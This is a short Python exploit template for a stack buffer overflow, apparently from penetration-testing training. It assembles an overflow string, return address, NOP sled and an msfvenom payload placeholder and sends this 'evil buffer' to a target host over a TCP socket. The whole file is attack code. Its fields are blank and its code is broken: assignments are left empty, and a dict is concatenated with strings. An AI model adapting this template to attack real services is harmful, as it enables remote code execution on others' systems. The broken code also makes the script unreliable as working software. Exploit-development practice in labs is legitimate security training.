#!/bin/python3

import socket
import time
import sys
import os

ip = ""       #target ip address
port =        #target port 
prefix = ""   #Tested function
offset =      #Overflow boundary
overflow = "A" * offset
retn = ""     #Return address
padding = "\x90" * 16
payloadchar = {}   #Payload generated by msfvenom
postfix = ""  #none

buffer = prefix + overflow + retn + padding + payloadchar + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
	start2 = 1
except:
	print("Could not connect.")
	start2 = 1
